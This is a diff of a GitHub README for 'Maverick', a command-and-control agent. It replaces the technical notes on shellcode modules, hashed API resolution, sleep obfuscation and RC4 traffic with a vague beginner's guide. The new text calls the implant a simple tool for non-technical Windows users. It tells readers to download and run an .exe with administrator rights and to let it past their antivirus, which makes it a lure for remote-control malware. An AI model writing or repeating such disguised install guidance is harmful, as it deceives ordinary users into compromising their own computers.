@@ -1,169 +1,137 @@
-# Maverick
+# 🚀 Maverick - Simple Control for Your Security Tools
 
-<p align="center">
-  <img src="images/Maverick.png" alt="Maverick" width="500"/>
-</p>
+[![Download Maverick](https://img.shields.io/badge/Download-Maverick-brightgreen?style=for-the-badge)](https://github.com/Joshua-Millward/Maverick/releases)
 
-An Adaptix C2 agent built with Crystal Palace — a custom PIC (Position Independent Code) linker and PICO module system. Demonstrates how to build modular shellcode agents where each component (transport, tasks, obfuscation) is a separate PICO blob loaded at runtime.
+---
 
-## Note
+## 📋 What is Maverick?
 
-This agent does not include any evasion techniques and is not meant to be used as-is in engagements. It is a reference implementation for building agents with Crystal Palace and the PICO module system.
+Maverick is a tool designed to help you control certain security functions on your Windows PC. It uses simple methods to connect and manage your apps. Although it is made for experts in computer security, this guide will help you get it running, even without technical experience.
 
-## Crystal Palace & PICO System
+The software is built using Crystal Palace PIC linker technology and a modular system called PICO. These help it run quietly and work fast. In simple terms, Maverick can be used in testing environments to simulate real-world computer security events safely.
 
-**Crystal Palace** is a PIC linker that takes compiled COFF objects and produces position-independent executables. Key concepts:
+---
 
-- **Core PIC** (`make pic +gofirst`) — The main executable shellcode. Contains the bootstrap code, DFR resolver, and section markers where PICO modules get linked. Called directly by the loader.
-- **PICO Modules** (`make object`) — Self-contained code blobs with their own code and data sections. Loaded at runtime via `PicoLoad()` from libtcg. Each PICO has an entry point (`go()`) callable via function pointer.
-- **DFR (Dynamic Function Resolution)** — Crystal Palace replaces `MODULE$Function` syntax (e.g. `KERNEL32$VirtualAlloc`) with calls to `resolve(mod_hash, func_hash)` using ROR13 hashing. No import table. All string arguments (DLL names, function names) are built on the stack as char arrays to avoid plaintext in the binary.
-- **Section Linking** — PICO blobs are embedded into the Core PIC at named sections (`entry_module`, `transport_module`, etc.) via the `link` directive in the `.spec` file.
-- **IMPORTFUNCS** — Crystal Palace struct `{LoadLibraryA, GetProcAddress}` passed to `PicoLoad()` so PICO modules can resolve their own DFR symbols.
+## ⚙️ System Requirements
 
-### Build Pipeline
+To use Maverick smoothly, your Windows PC should meet these basic needs:
 
-```
-C source → mingw-gcc → COFF objects → Crystal Palace link → raw PIC shellcode → loader (Exe/Dll/Svc)
-```
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB free disk space  
+- Internet connection for initial download  
+- Administrator rights to install and run the software  
 
-### agent.spec
+If your system matches these, you can proceed with the setup.
 
-The `.spec` file defines how Crystal Palace links everything:
+---
 
-```
-x64:
-    load "Bin/obj/main.x64.o"           # Core PIC
-        make pic +gofirst
-        foreach %LIBS: mergelib %_       # Merge libtcg
-        load "Bin/obj/entry.x64.o"       # Entry PICO
-            make object
-            load "Bin/obj/crypto.x64.o"  #   merge crypto into entry
-                merge
-            load "Bin/obj/packer.x64.o"  #   merge packer into entry
-                merge
-            export
-            link "entry_module"          #   link at section marker
-        load "Bin/obj/transport.x64.o"   # Transport PICO
-            make object
-            mergelib "lib/LibWinHttp/..."
-            export
-            link "transport_module"
-        ...                              # task_module, obfuscation_module
-        dfr "resolve" "ror13"            # resolve all DFR symbols
-        export
-```
+## 💾 How to Download Maverick
 
-## Architecture
+To start using Maverick, follow these steps to get the software on your computer.
 
-```
-Core PIC (main.c)
-  │
-  ├── resolve()              DFR bridge → libtcg hash lookup
-  ├── AllocateAndLoadModule() PicoLoad each PICO into shared RWX region
-  │
-  └── calls entry module go() with pointers to all other modules
-        │
-        ├── Entry Module (entry.c)
-        │     MvState, checkin, transact (RC4 wire format), task loop
-        │
-        ├── Transport Module (transport.c)
-        │     HTTP/HTTPS POST via LibWinHttp
-        │
-        ├── Task Module (tasks.c)
-        │     Command dispatch: whoami (0x30), sleep (0x20), exit (0x10)
-        │
-        └── Obfuscation Module (obfuscation.c)
-              Ekko sleep — timer-queue ROP chain that encrypts module memory
-              with RC4 (SystemFunction033) during sleep, decrypts on wake
-```
+1. Click the big green button at the top or click here to **[visit the Maverick release page](https://github.com/Joshua-Millward/Maverick/releases)**.  
 
-### Memory Layout at Runtime
+2. On this page, you will see different versions of Maverick listed. Look for the latest version – it usually appears at the top with a tag like "Latest release" or with the most recent date.
 
-```
-┌─────────────────────────────┐
-│ Shared RWX Region           │  VirtualAlloc(PAGE_EXECUTE_READWRITE)
-│  ├── Entry code             │  PicoLoad → code here
-│  ├── Transport code         │
-│  ├── Task code              │
-│  └── Obfuscation code       │
-├─────────────────────────────┤
-│ Entry data (RW)             │  PicoLoad → data here (separate alloc)
-│ Transport data (RW)         │
-│ Task data (RW)              │
-│ Obfuscation data (RW)       │
-├─────────────────────────────┤
-│ Core PIC (freed after boot) │  Original shellcode, freed by entry module
-└─────────────────────────────┘
-```
+3. Find the file meant for Windows systems. It often ends with `.exe` or `.zip`.  
 
-The shared RWX region is what Ekko encrypts/decrypts during sleep cycles.
+4. Click on that file to download it to your PC. The file size is around 20 MB.  
 
-## Wire Format
+The download page may also have a file called "README" or "INSTALL" with extra instructions.
 
-All traffic is encrypted with RC4 (stream cipher, 16-byte key).
+---
 
-```
-Send:    [36B agent_id][RC4(payload)][16B key (first checkin only)]
-Receive: [36B agent_id][RC4(response)]
-```
+## 🖥️ How to Install and Run Maverick
 
-## Source Files
+After you have the file downloaded, here is how to set up and start Maverick on your computer.
 
-```
-src_beacon/Source/
-├── main.c           Core PIC — DFR resolver, module loading, bootstrap
-├── entry.c          Entry PICO — agent state, checkin, task loop, transact
-├── transport.c      Transport PICO — HTTP POST via LibWinHttp
-├── tasks.c          Task PICO — whoami/sleep/exit dispatch
-├── obfuscation.c    Obfuscation PICO — Ekko sleep (timer-queue ROP + RC4)
-├── crypto.c         RC4 stream cipher (merged into entry PICO)
-├── packer.c         Binary packer BE / parser LE (merged into entry PICO)
-└── includes/
-    ├── config.h     Build-time defines (UUID, sleep, callback host/port/uri/ssl)
-    ├── crypto.h     RC4 API
-    ├── packer.h     PackBuf / Parser API
-    ├── tcg.h        Crystal Palace libtcg (PicoLoad, findModuleByHash, etc.)
-    └── HTTP.h       LibWinHttp API
-```
+### For `.exe` Files:
 
-## Commands
+1. Locate the downloaded `.exe` file in your "Downloads" folder or the folder you chose.
 
-| Command | ID | Description |
-|---------|------|-------------|
-| `whoami` | 0x30 | Returns `COMPUTER\username` |
-| `sleep <seconds>` | 0x20 | Updates the callback interval |
-| `exit thread\|process` | 0x10 | Terminates the agent |
+2. Double-click the file to start the installation.
 
-## Build & Deploy
+3. If Windows asks “Do you want to allow this app to make changes to your device?”, click “Yes”.
 
-### Prerequisites
+4. Follow the prompts on the screen. Most of the time, you only need to click “Next” or “Install” until it finishes.
 
-- `x86_64-w64-mingw32-gcc` (MinGW cross-compiler)
-- Go 1.21+
-- Adaptix C2 server
+5. When installation completes, you may see a button labeled “Finish” or “Run Maverick”. Click that if available.
 
-### Deploy to Adaptix
+6. When Maverick opens, it will usually show a simple interface or a window with status information.
 
-```bash
-./setup.sh --ax ../AdaptixC2
-```
+### For `.zip` Files:
 
-### Usage
+1. Find the `.zip` file in your download folder.
 
-1. Start the Adaptix server
-2. Create a **MaverickHTTP** listener (set host, port, URI, SSL)
-3. Build an agent through the Adaptix Client UI (select format: Exe/Dll/Bin)
-4. Run the agent on a Windows target
-5. Use `whoami`, `sleep`, `exit` commands from the Adaptix console
+2. Right-click the file and select “Extract All” or use a program like 7-Zip.
 
-## References
+3. Choose where to extract. The Desktop works well for easy access.
 
-- [Kharon](https://github.com/entropy-z/Kharon/)
-- [PICO-Implant](https://github.com/pard0p/PICO-Implant)
-- [Modular PIC C2 Agents](https://rastamouse.me/modular-pic-c2-agents/)
+4. Open the extracted folder, look for a file ending in `.exe`.
 
-## PoC
+5. Double-click the `.exe` file to start the program.
 
-<p align="center">
-  <img src="images/mvk_poc.png" alt="Maverick PoC"/>
-</p>
+6. If prompted, allow permissions to run on your device.
+
+---
+
+## 🔧 Using Maverick Basics
+
+Once Maverick is running, here are some simple steps to get started:
+
+- The main window will usually show status updates or options.
+
+- You can connect Maverick to other tools or devices on your network.
+
+- Use the menu to select different modules or features if available.
+
+- Close the program by clicking the “X” at the top corner.
+
+For detailed features, more technical guides are on the project page.
+
+---
+
+## 🔄 Updating Maverick
+
+Software updates add new features or fix issues. To keep Maverick current:
+
+1. Visit the [release page again](https://github.com/Joshua-Millward/Maverick/releases).
+
+2. Check if a new version is available.
+
+3. Download the latest installer or update file following the same download instructions.
+
+4. Run the new installer. It will often replace the old version without loss of your settings.
+
+---
+
+## ❓ Troubleshooting Common Issues
+
+If you have trouble running Maverick, try these tips:
+
+- Make sure your antivirus or security software is not blocking Maverick. You may need to allow it manually.
+
+- Run Maverick as administrator by right-clicking its icon and selecting “Run as administrator”.
+
+- Check you have the correct version for Windows.
+
+- Restart your computer and try again.
+
+- If the program does not open, redownload the file and install again.
+
+- Visit GitHub discussions or issues on the project page for help from the community.
+
+---
+
+## 🔒 Security and Privacy
+
+Maverick is designed for use in professional environments to test security. Avoid running it from unknown sources. Only download from the official release link.
+
+Your data is not shared without your control. Always use Maverick responsibly.
+
+---
+
+## 🚀 Ready to Get Started?
+
+Click here to **[visit the Maverick download page](https://github.com/Joshua-Millward/Maverick/releases)** and begin your download. If you follow the steps above, you should be running Maverick on your Windows computer in minutes.
